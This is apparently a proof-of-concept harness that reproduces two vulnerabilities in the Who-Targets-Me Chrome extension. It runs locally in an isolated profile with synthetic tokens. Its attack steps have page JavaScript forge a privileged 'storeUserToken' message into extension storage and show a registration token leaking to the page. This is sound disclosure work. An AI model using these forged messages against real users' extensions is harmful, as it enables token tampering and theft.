#!/usr/bin/env node

/**
 * Browser-level reproducer for WTM-MAP-01 and WTM-MAP-02.
 *
 * The harness builds Who-Targets-Me with OFFLINE=true, loads the resulting
 * unpacked extension into a temporary Chrome profile, and serves a harmless
 * localhost page matching the extension's content-script allowlist.
 *
 * It never contacts the production WhoTargetsMe APIs and deletes the temporary
 * Chrome profile unless --keep-temp is supplied.
 */

import { createServer } from 'node:http';
import {
  appendFileSync,
  cpSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { randomUUID } from 'node:crypto';

const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const defaultRepo = path.resolve(scriptDir, '..', '..', 'Who-Targets-Me');

function usage() {
  console.log(`Usage: node scripts/test-wtm-extension-bridge.mjs [options]

Options:
  --repo PATH       Who-Targets-Me checkout (default: ${defaultRepo})
  --chrome PATH     Chrome/Chromium executable
  --install         Run npm ci before building
  --skip-build      Reuse build/chrome instead of running the offline build
  --headed          Show Chrome instead of using headless mode
  --keep-temp       Keep the isolated profile and copied extension after the run
  --timeout MS      Startup/test timeout in milliseconds (default: 30000)
  -h, --help        Show this help

The test is intentionally local-only. It uses OFFLINE=true, a new Chrome
profile, a localhost test page, and synthetic marker tokens.`);
}

function parseArgs(argv) {
  const options = {
    repo: defaultRepo,
    chrome: null,
    install: false,
    skipBuild: false,
    headed: false,
    keepTemp: false,
    timeout: 30_000,
  };

  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    switch (arg) {
      case '--repo':
        options.repo = path.resolve(argv[++i] ?? '');
        break;
      case '--chrome':
        options.chrome = path.resolve(argv[++i] ?? '');
        break;
      case '--install':
        options.install = true;
        break;
      case '--skip-build':
        options.skipBuild = true;
        break;
      case '--headed':
        options.headed = true;
        break;
      case '--keep-temp':
        options.keepTemp = true;
        break;
      case '--timeout': {
        const value = Number(argv[++i]);
        if (!Number.isFinite(value) || value < 1_000) {
          throw new Error('--timeout must be a number of at least 1000 ms');
        }
        options.timeout = value;
        break;
      }
      case '-h':
      case '--help':
        usage();
        process.exit(0);
      default:
        throw new Error(`Unknown argument: ${arg}`);
    }
  }
  return options;
}

function commandExists(command) {
  return spawnSync('sh', ['-c', `command -v "${command}"`], {
    stdio: 'ignore',
  }).status === 0;
}

function browserIdentity(executable) {
  const result = spawnSync(executable, ['--version'], {
    encoding: 'utf8',
    timeout: 5_000,
  });
  return `${result.stdout ?? ''}${result.stderr ?? ''}`.trim();
}

function unsupportedOfficialChrome(executable) {
  const identity = browserIdentity(executable);
  const isForTesting = /Chrome for Testing/i.test(identity) ||
    /Chrome for Testing\.app/i.test(executable);
  const isOfficialChrome = /^Google Chrome\b/i.test(identity) ||
    /Google Chrome\.app/i.test(executable) ||
    /(?:^|\/)google-chrome(?:-stable)?$/i.test(executable);
  const major = Number(identity.match(/(?:Chrome|Chromium)\s+(\d+)/i)?.[1]);
  return {
    identity: identity || executable,
    unsupported:
      isOfficialChrome && !isForTesting && (!Number.isFinite(major) || major >= 137),
  };
}

function findCachedChromeForTesting(root, depth = 0) {
  if (!existsSync(root) || depth > 7) return null;
  let entries;
  try {
    entries = readdirSync(root, { withFileTypes: true });
  } catch {
    return null;
  }
  for (const entry of entries) {
    const candidate = path.join(root, entry.name);
    if (
      entry.isFile() &&
      (entry.name === 'Google Chrome for Testing' || entry.name === 'chrome') &&
      /chrome-(?:mac|linux)|Chrome for Testing\.app/i.test(candidate)
    ) {
      return candidate;
    }
  }
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    const found = findCachedChromeForTesting(path.join(root, entry.name), depth + 1);
    if (found) return found;
  }
  return null;
}

function findChrome(explicitPath) {
  if (explicitPath) {
    if (!existsSync(explicitPath)) {
      throw new Error(`Chrome executable does not exist: ${explicitPath}`);
    }
    const status = unsupportedOfficialChrome(explicitPath);
    if (status.unsupported) {
      throw new Error(
        `${status.identity} cannot load unpacked extensions from the command line.\n` +
          'Use Chrome for Testing or Chromium with --chrome PATH.',
      );
    }
    return explicitPath;
  }

  for (const candidate of [
    '/Applications/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing',
    path.join(
      homedir(),
      'Applications',
      'Google Chrome for Testing.app',
      'Contents',
      'MacOS',
      'Google Chrome for Testing',
    ),
    '/Applications/Chromium.app/Contents/MacOS/Chromium',
    path.join(homedir(), 'Applications', 'Chromium.app', 'Contents', 'MacOS', 'Chromium'),
  ]) {
    if (existsSync(candidate)) return candidate;
  }

  for (const command of [
    'chrome-for-testing',
    'chromium',
    'chromium-browser',
  ]) {
    if (commandExists(command)) return command;
  }

  for (const cacheRoot of [
    path.resolve(scriptDir, '..', 'chrome'),
    path.resolve(process.cwd(), 'chrome'),
    path.join(homedir(), '.cache', 'puppeteer', 'chrome'),
  ]) {
    const cachedChrome = findCachedChromeForTesting(cacheRoot);
    if (cachedChrome) return cachedChrome;
  }

  const officialCandidates = [
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    'google-chrome',
    'google-chrome-stable',
  ];
  const installedOfficial = officialCandidates.find((candidate) =>
    candidate.startsWith('/') ? existsSync(candidate) : commandExists(candidate),
  );
  const detected = installedOfficial
    ? ` Detected incompatible browser: ${unsupportedOfficialChrome(installedOfficial).identity}.`
    : '';
  throw new Error(
    'No extension-test browser found. Official Chrome 137+ ignores --load-extension.' +
      detected +
      '\nInstall Chrome for Testing with:\n' +
      '  npx --yes @puppeteer/browsers@latest install chrome@stable\n' +
      'The harness will auto-detect it, or pass its executable with --chrome PATH.',
  );
}

function run(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: options.cwd,
    env: options.env ?? process.env,
    stdio: 'inherit',
  });
  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(`${command} ${args.join(' ')} exited ${result.status}`);
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitFor(description, timeoutMs, callback) {
  const deadline = Date.now() + timeoutMs;
  let lastError;
  while (Date.now() < deadline) {
    try {
      const value = await callback();
      if (value) return value;
    } catch (error) {
      lastError = error;
    }
    await sleep(100);
  }
  const suffix = lastError ? `: ${lastError.message}` : '';
  throw new Error(`Timed out waiting for ${description}${suffix}`);
}

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, 'localhost', () => {
      server.off('error', reject);
      resolve(server.address().port);
    });
  });
}

function closeServer(server) {
  return new Promise((resolve) => server.close(resolve));
}

async function stopProcess(child) {
  if (!child || child.exitCode !== null) return;
  child.kill('SIGTERM');
  const exited = await Promise.race([
    new Promise((resolve) => child.once('exit', () => resolve(true))),
    sleep(3_000).then(() => false),
  ]);
  if (!exited && child.exitCode === null) child.kill('SIGKILL');
}

function loadWebSocket(repo) {
  try {
    const requireFromTarget = createRequire(path.join(repo, 'package.json'));
    return requireFromTarget('ws');
  } catch {
    throw new Error(
      `The target dependencies are missing. Run this harness with --install, ` +
        `or run npm ci in ${repo}`,
    );
  }
}

async function cdpEvaluate(WebSocket, wsUrl, expression) {
  return new Promise((resolve, reject) => {
    const socket = new WebSocket(wsUrl);
    const timer = setTimeout(() => {
      socket.terminate();
      reject(new Error('CDP evaluation timed out'));
    }, 10_000);

    socket.once('open', () => {
      socket.send(
        JSON.stringify({
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression,
            awaitPromise: true,
            returnByValue: true,
          },
        }),
      );
    });
    socket.on('message', (bytes) => {
      const message = JSON.parse(bytes.toString());
      if (message.id !== 1) return;
      clearTimeout(timer);
      socket.close();
      if (message.error) {
        reject(new Error(message.error.message));
        return;
      }
      if (message.result?.exceptionDetails) {
        const detail = message.result.exceptionDetails;
        reject(new Error(detail.exception?.description ?? detail.text));
        return;
      }
      resolve(message.result?.result?.value);
    });
    socket.once('error', (error) => {
      clearTimeout(timer);
      reject(error);
    });
  });
}

async function fetchTargets(port) {
  const response = await fetch(`http://127.0.0.1:${port}/json/list`);
  if (!response.ok) throw new Error(`DevTools returned HTTP ${response.status}`);
  return response.json();
}

function printChromeErrors(lines) {
  if (lines.length === 0) return;
  console.error('\nRecent Chrome output:');
  console.error(lines.slice(-30).join('\n'));
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const repo = options.repo;
  const chrome = findChrome(options.chrome);
  console.log(`Using browser: ${browserIdentity(chrome) || chrome}`);
  const manifest = path.join(repo, 'package.json');
  if (!existsSync(manifest)) {
    throw new Error(`Not a Who-Targets-Me checkout: ${repo}`);
  }

  if (options.install) run('npm', ['ci'], { cwd: repo });
  const WebSocket = loadWebSocket(repo);

  if (!options.skipBuild) {
    console.log('Building the Chrome extension with OFFLINE=true...');
    run('npm', ['run', 'build:chrome'], {
      cwd: repo,
      env: { ...process.env, BROWSER: 'chrome', OFFLINE: 'true' },
    });
  }

  const builtExtension = path.join(repo, 'build', 'chrome');
  if (!existsSync(path.join(builtExtension, 'manifest.json'))) {
    throw new Error(
      `Missing ${path.join(builtExtension, 'manifest.json')}; remove ` +
        '--skip-build or build the extension first',
    );
  }

  const tempRoot = mkdtempSync(path.join(tmpdir(), 'wtm-extension-poc-'));
  const profileDir = path.join(tempRoot, 'profile');
  const extensionDir = path.join(tempRoot, 'extension');
  cpSync(builtExtension, extensionDir, { recursive: true });

  const marker = `wtm-browser-poc-${randomUUID()}`;
  const exposureMarker = `wtm-page-token-${randomUUID()}`;
  const harnessChannel = `wtm-harness-${randomUUID()}`;
  const workerBundle = path.join(extensionDir, 'daemon', 'worker.js');
  const contentBundle = path.join(extensionDir, 'daemon', 'index.js');

  // Add observability only to the disposable extension copy. The hooks let the
  // localhost page ask the real service worker to report storage or synthesize
  // a registration response without relying on Chrome exposing worker CDP
  // targets. They do not handle either vulnerable production message.
  appendFileSync(
    workerBundle,
    `\n;(() => {
      const channel = ${JSON.stringify(harnessChannel)};
      chrome.runtime.onMessage.addListener((request, sender) => {
        if (request?.__wtmHarnessChannel !== channel || !sender.tab?.id) return false;
        const reply = (payload) => chrome.tabs.sendMessage(sender.tab.id, {
          __wtmHarnessChannel: channel,
          ...payload
        }).catch(() => {});
        if (request.kind === 'ping') {
          void reply({ kind: 'pong' });
        } else if (request.kind === 'read-storage') {
          void chrome.storage.local.get('general_token').then((items) =>
            reply({ kind: 'storage-result', value: items.general_token ?? null })
          );
        } else if (request.kind === 'emit-registration') {
          void chrome.tabs.sendMessage(sender.tab.id, {
            registrationFeedback: { token: request.token }
          }).catch(() => {});
        }
        return false;
      });
    })();\n`,
  );
  appendFileSync(
    contentBundle,
    `\n;(() => {
      const channel = ${JSON.stringify(harnessChannel)};
      chrome.runtime.onMessage.addListener((request) => {
        if (request?.__wtmHarnessChannel === channel) {
          window.postMessage(request, '*');
        }
        return false;
      });
    })();\n`,
  );

  const chromeOutput = [];
  let chromeProcess;
  let server;

  try {
    server = createServer((_request, response) => {
      response.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
      });
      response.end(
        '<!doctype html><meta charset="utf-8"><title>WTM bridge test</title>' +
          '<h1>Who-Targets-Me extension bridge test</h1>',
      );
    });
    const pagePort = await listen(server);
    const pageUrl = `http://localhost:${pagePort}/`;

    const chromeArgs = [
      '--remote-allow-origins=*',
      '--remote-debugging-port=0',
      `--user-data-dir=${profileDir}`,
      `--disable-extensions-except=${extensionDir}`,
      `--load-extension=${extensionDir}`,
      '--disable-background-networking',
      '--disable-component-update',
      '--disable-sync',
      '--metrics-recording-only',
      '--no-first-run',
      '--no-default-browser-check',
      '--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE localhost',
    ];
    if (!options.headed) chromeArgs.push('--headless=new', '--disable-gpu');
    chromeArgs.push(pageUrl);

    console.log('Launching Chrome with a temporary, isolated profile...');
    chromeProcess = spawn(chrome, chromeArgs, {
      stdio: ['ignore', 'ignore', 'pipe'],
    });
    chromeProcess.stderr.setEncoding('utf8');
    chromeProcess.stderr.on('data', (chunk) => {
      chromeOutput.push(...chunk.split(/\r?\n/).filter(Boolean));
      if (chromeOutput.length > 100) chromeOutput.splice(0, chromeOutput.length - 100);
    });

    const activePortFile = path.join(profileDir, 'DevToolsActivePort');
    const devtoolsPort = await waitFor(
      'Chrome DevTools port',
      options.timeout,
      async () => {
        if (chromeProcess.exitCode !== null) {
          throw new Error(`Chrome exited ${chromeProcess.exitCode}`);
        }
        if (!existsSync(activePortFile)) return null;
        const value = Number(readFileSync(activePortFile, 'utf8').split(/\r?\n/)[0]);
        return Number.isInteger(value) && value > 0 ? value : null;
      },
    );

    let pageTarget;
    await waitFor('test page target', options.timeout, async () => {
      const targets = await fetchTargets(devtoolsPort);
      pageTarget = targets.find((target) => target.url === pageUrl);
      return pageTarget?.webSocketDebuggerUrl;
    });

    const pageWs = pageTarget.webSocketDebuggerUrl;

    await cdpEvaluate(
      WebSocket,
      pageWs,
      `new Promise((resolve) => {
        if (document.readyState === 'complete') return resolve(true);
        addEventListener('load', () => resolve(true), { once: true });
      })`,
    );
    await sleep(500);

    await cdpEvaluate(
      WebSocket,
      pageWs,
      `(() => {
        window.__wtmHarnessMessages = [];
        addEventListener('message', (event) => {
          if (event.data?.__wtmHarnessChannel === ${JSON.stringify(harnessChannel)} ||
              event.data?.registrationFeedback) {
            window.__wtmHarnessMessages.push(event.data);
          }
        });
        window.postMessage({
          __wtmHarnessChannel: ${JSON.stringify(harnessChannel)},
          kind: 'ping'
        }, '*');
        return true;
      })()`,
    );
    await waitFor(
      'test hook response (the extension may not have loaded or injected)',
      options.timeout,
      () =>
        cdpEvaluate(
          WebSocket,
          pageWs,
          `window.__wtmHarnessMessages.some((message) =>
            message?.__wtmHarnessChannel === ${JSON.stringify(harnessChannel)} &&
            message?.kind === 'pong'
          )`,
        ),
    );

    // WTM-MAP-01: ordinary page JavaScript forges a privileged extension command.
    await cdpEvaluate(
      WebSocket,
      pageWs,
      `window.postMessage({ storeUserToken: true, token: ${JSON.stringify(marker)} }, '*')`,
    );
    const storedToken = await waitFor(
      'forged token to reach extension storage',
      options.timeout,
      async () => {
        await cdpEvaluate(
          WebSocket,
          pageWs,
          `window.postMessage({
            __wtmHarnessChannel: ${JSON.stringify(harnessChannel)},
            kind: 'read-storage'
          }, '*')`,
        );
        const value = await cdpEvaluate(
          WebSocket,
          pageWs,
          `window.__wtmHarnessMessages
            .filter((message) =>
              message?.__wtmHarnessChannel === ${JSON.stringify(harnessChannel)} &&
              message?.kind === 'storage-result'
            )
            .at(-1)?.value ?? null`,
        );
        return value === marker ? value : null;
      },
    );

    // WTM-MAP-02: registration feedback is copied into the page origin and
    // broadcast to any page listener using targetOrigin="*".
    await cdpEvaluate(
      WebSocket,
      pageWs,
      `window.postMessage({
        __wtmHarnessChannel: ${JSON.stringify(harnessChannel)},
        kind: 'emit-registration',
        token: ${JSON.stringify(exposureMarker)}
      }, '*')`,
    );
    const pageExposure = await waitFor(
      'registration token to reach the page origin',
      options.timeout,
      () =>
        cdpEvaluate(
          WebSocket,
          pageWs,
          `(() => ({
            localStorageValue: localStorage.getItem('general_token'),
            broadcastToken: window.__wtmHarnessMessages?.at(-1)?.registrationFeedback?.token ?? null
          }))()`,
        ).then((value) =>
          value?.localStorageValue === JSON.stringify(exposureMarker) &&
          value?.broadcastToken === exposureMarker
            ? value
            : null,
        ),
    );

    console.log('\nVULNERABLE: both browser-level checks reproduced.');
    console.log(
      JSON.stringify(
        {
          'WTM-MAP-01': {
            result: 'reproduced',
            pageMessageChangedExtensionStorage: storedToken === marker,
          },
          'WTM-MAP-02': {
            result: 'reproduced',
            tokenWrittenToPageLocalStorage:
              pageExposure.localStorageValue === JSON.stringify(exposureMarker),
            tokenBroadcastToPage: pageExposure.broadcastToken === exposureMarker,
          },
          whoTargetsMeProductionApiUsed: false,
          profile: 'temporary and isolated',
        },
        null,
        2,
      ),
    );
  } catch (error) {
    printChromeErrors(chromeOutput);
    throw error;
  } finally {
    await stopProcess(chromeProcess);
    if (server) await closeServer(server);
    if (options.keepTemp) {
      console.log(`Temporary files kept at: ${tempRoot}`);
    } else {
      rmSync(tempRoot, { recursive: true, force: true });
    }
  }
}

main().catch((error) => {
  console.error(`\nHarness failed: ${error.message}`);
  process.exitCode = 1;
});
